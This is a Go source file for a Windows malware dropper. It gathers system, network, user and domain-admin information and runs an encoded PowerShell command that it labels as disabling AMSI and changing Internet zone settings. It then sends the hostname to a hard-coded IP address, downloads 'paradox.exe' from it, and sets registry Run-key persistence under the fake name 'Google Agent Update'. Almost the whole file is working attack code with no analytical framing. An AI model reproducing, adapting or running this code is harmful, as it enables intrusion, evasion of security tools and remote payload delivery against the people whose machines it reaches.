package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"os/exec"

	"golang.org/x/sys/windows/registry"
)

func main() {
	outfile, err := os.CreateTemp("", "*.sysinfo.txt")

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	defer os.Remove(outfile.Name())

	systemInfo(outfile)
	tasklistInfo(outfile)
	ipconfigInfo(outfile)
	netInfo(outfile)
	whoamiInfo(outfile)
	netstatInfo(outfile)
	regQueryInternet(outfile)
	regQueryInternetProxy(outfile)
	disableAmsiModifyInternet(outfile)

	ipAdd := "http://45.79.68.17:8080"
	sendHostname(outfile, ipAdd)
	filename := downloadFile(ipAdd+"/paradox.exe", `*.paradox.exe`, outfile)
	addPersistence(filename, outfile)

}

func systemInfo(outfile *os.File) {
	systeminfo_app := "systeminfo.exe"

	outfile.WriteString("\r\nObtaining system info...")

	cmd := exec.Command(systeminfo_app)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get system info")
	}

	cmd.Wait()

	return
}

func tasklistInfo(outfile *os.File) {
	app := "tasklist"

	outfile.WriteString("\r\nObtaining tasklist info...")

	cmd := exec.Command(app)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get tasklist info")
	}

	cmd.Wait()

	return
}

func ipconfigInfo(outfile *os.File) {
	app := "ipconfig.exe"
	arg0 := "/all"

	outfile.WriteString("\r\nObtaining ipconfig info...")

	cmd := exec.Command(app, arg0)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get ipconfig info")
	}

	cmd.Wait()

	return
}

func netInfo(outfile *os.File) {
	app := "net.exe"
	arg0 := "group"
	arg1 := "\"domain admins\""
	arg2 := "/domain"

	outfile.WriteString("\r\nObtaining net info...")

	cmd := exec.Command(app, arg0, arg1, arg2)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get net info")
	}

	cmd.Wait()

	return
}

func whoamiInfo(outfile *os.File) {
	app := "whoami.exe"

	outfile.WriteString("\r\nObtaining whoami info...")

	cmd := exec.Command(app)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get whoami info")
	}

	cmd.Wait()

	return
}

func netstatInfo(outfile *os.File) {
	app := "netstat.exe"
	arg0 := "-f"

	outfile.WriteString("\r\nObtaining netstat info...")

	cmd := exec.Command(app, arg0)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get netstat info")
	}

	cmd.Wait()

	return
}

func regQueryInternet(outfile *os.File) {
	app := "reg"
	arg0 := "query"
	arg1 := "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"

	outfile.WriteString("\r\nObtaining Internet Settings info...")

	cmd := exec.Command(app, arg0, arg1)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to get Internet Settings registry data")
	}

	cmd.Wait()

	return
}

func regQueryInternetProxy(outfile *os.File) {
	outfile.WriteString("\r\nObtaining Internet Proxy info...")

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.QUERY_VALUE)

	if err != nil {
		fmt.Println("Failed to get Internet Proxy key")

		return
	}

	defer k.Close()

	s, _, err := k.GetStringValue("Proxy Server")

	if err != nil {
		outfile.WriteString("ProxyServer: N/A")

		return
	}

	outfile.WriteString("ProxyServer: " + s + "\r\n\n\n")
}

func disableAmsiModifyInternet(outfile *os.File) {
	app := "powershell.exe"
	arg0 := "-enc"
	arg1 := "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNACcAIAArACAAIABbAGMAaABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA2ADEAKQAgACsAIAAnAG4AYQBnAGUAbQAnACAAKwAgACcAZQBuAHQALgBBAHUAdAAnACAAKwAgACcAbwBtAGEAJwAgACsAIABbAGMAaABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA3ADQAKQAgACsAIAAnAGkAbwBuAC4AQQBtACcAIAArACAAWwBjAGgAYQByAF0AKAAxADEANQApACAAKwAgACcAaQBVAHQAaQBsACcAIAArACAAWwBjAGgAYQByAF0AKAAxADEANQApACkALgBHAGUAdABGAGkAZQBsAGQAKABbAGMAaABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA2ADEAKQAgACsAIAAnAG0AcwBpAEkAbgBpACcAIAArACAAWwBjAGgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANwA0ACkAIAArACAAJwBGAGEAaQBsAGUAZAAnACwAIAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwAnACAAKwAgAFsAYwBoAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADcANAApACAAKwAgACcAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAgACQAVAByAHUAZQApADsAIAAkAE4AZQB3AFYAYQBsAHUAZQAgAD0AIAAxADsAIAAkAEkAbgB0AGUAcgBuAGUAdABTAGUAdAB0AGkAbgBnAHMAUABhAHQAaAAgAD0AIAAiAEgASwBDAFUAOgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbgB0AGUAcgBuAGUAdAAgAFMAZQB0AHQAaQBuAGcAcwBcAFoAbwBuAGUATQBhAHAAIgA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQASQBuAHQAZQByAG4AZQB0AFMAZQB0AHQAaQBuAGcAcwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBQAHIAbwB4AHkAQgB5AHAAYQBzAHMAIgAgAC0AVgBhAGwAdQBlACAAJABOAGUAdwBWAGEAbAB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAEkAbgB0AGUAcgBuAGUAdABTAGUAdAB0AGkAbgBnAHMAUABhAHQAaAAgAC0ATgBhAG0AZQAgACIASQBuAHQAcgBhAG4AZQB0AE4AYQBtAGUAIgAgAC0AVgBhAGwAdQBlACAAJABOAGUAdwBWAGEAbAB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAEkAbgB0AGUAcgBuAGUAdABTAGUAdAB0AGkAbgBnAHMAUABhAHQAaAAgAC0ATgBhAG0AZQAgACIAVQBOAEMAQQBzAEkAbgB0AHIAYQBuAGUAdAAiACAALQBWAGEAbAB1AGUAIAAkAE4AZQB3AFYAYQBsAHUAZQA7ACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFAAcgBvAHgAeQBCAHkAcABhAHMAcwA6ACAAJAAoACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQASQBuAHQAZQByAG4AZQB0AFMAZQB0AHQAaQBuAGcAcwBQAGEAdABoACAALQBOAGEAbQBlACAAJwBQAHIAbwB4AHkAQgB5AHAAYQBzAHMAJwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABQAHIAbwB4AHkAQgB5AHAAYQBzAHMAKQAgAC0AZQBxACAAJABOAGUAdwBWAGEAbAB1AGUAKQBgAG4ASQBuAHQAcgBhAG4AZQB0AE4AYQBtAGUAOgAgACQAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAEkAbgB0AGUAcgBuAGUAdABTAGUAdAB0AGkAbgBnAHMAUABhAHQAaAAgAC0ATgBhAG0AZQAgACcASQBuAHQAcgBhAG4AZQB0AE4AYQBtAGUAJwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABJAG4AdAByAGEAbgBlAHQATgBhAG0AZQApACAALQBlAHEAIAAkAE4AZQB3AFYAYQBsAHUAZQApAGAAbgBVAE4AQwBBAHMASQBuAHQAcgBhAG4AZQB0ADoAIAAkACgAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABJAG4AdABlAHIAbgBlAHQAUwBlAHQAdABpAG4AZwBzAFAAYQB0AGgAIAAtAE4AYQBtAGUAIAAnAFUATgBDAEEAcwBJAG4AdAByAGEAbgBlAHQAJwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABVAE4AQwBBAHMASQBuAHQAcgBhAG4AZQB0ACkAIAAtAGUAcQAgACQATgBlAHcAVgBhAGwAdQBlACkAIgA="

	outfile.WriteString("\r\nDisabling AMSI and modifying Internet Settings...")

	cmd := exec.Command(app, arg0, arg1)

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to change Internet Settings :( via PowerShell!")
	}

	cmd.Wait()

	return
}

func sendHostname(outfile *os.File, ipAdd string) {
	app := "hostname"
	hostname := ""

	outfile.WriteString("\r\nSending hostname...")

	cmd, err := exec.Command(app).Output()

	if err != nil {
		outfile.WriteString("Failed to get hostname")
		outfile.WriteString(err.Error())
		return
	}

	hostname = string(cmd)[:len(string(cmd))-2]
	fmt.Println(hostname)

	resp, err := http.Get(ipAdd + "/hostname?" + hostname)

	if err != nil {
		outfile.WriteString("sendHostname: Failed to send hostname.")
		outfile.WriteString(err.Error())
		return
	}

	outfile.WriteString("sendHostname: Successfully sent hostname.")

	defer resp.Body.Close()
}

func downloadFile(url string, filename string, outfile *os.File) string {
	// Ripped straight from some dude on Github https://gist.github.com/cnu/026744b1e86c6d9e22313d06cba4c2e9
	// Create the file
	var buf bytes.Buffer
	f, err := os.CreateTemp("", filename)
	if err != nil {
		outfile.WriteString("DownloadFile: Failed to create file.")
	}
	defer os.Remove(f.Name())

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		outfile.WriteString("DownloadFile: Failed to get file.")
	}
	defer resp.Body.Close()

	if err := resp.Write(&buf); err != nil {
		panic(err)
	}

	// Write the body to file
	// _, err = io.Copy(out, resp.Body)
	_, err = f.Write(buf.Bytes())
	if err != nil {
		outfile.WriteString("DownloadFile: Failed to write file.")
	}

	outfile.WriteString("DownloadFile: Successfully downloaded file.")

	return f.Name()
}

func addPersistence(filename string, outfile *os.File) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		outfile.WriteString("Failed to open registry for persistence!")
		return
	}

	defer k.Close()

	if err = k.SetStringValue("Google Agent Update", filename); err != nil {
		outfile.WriteString("Failed to write to registry for persistence!")
		return
	}

	outfile.WriteString("Successfully wrote to registry for persistence!")
}
